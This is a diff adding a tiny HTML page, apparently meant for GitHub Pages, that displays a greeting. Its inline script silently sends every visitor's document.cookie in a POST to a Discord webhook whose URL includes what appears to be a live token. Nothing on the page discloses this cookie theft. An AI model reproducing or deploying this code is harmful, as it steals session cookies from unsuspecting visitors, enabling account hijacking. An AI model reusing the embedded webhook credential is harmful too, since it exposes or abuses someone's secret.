@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<body>
+    <p>Hellooooooo</p>
+    <script>
+        fetch('https://discord.com/api/webhooks/1339752689122279555/ZtP7MhOIS8ltTUHAKSkHo7NAXQtMW54EvO4SHPCZhhXWTk9uU_Y1wSFJ9od0thtGvjur', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ content: 'hello from GH pages: ' + document.cookie })
+        });
+    </script>
+</body>
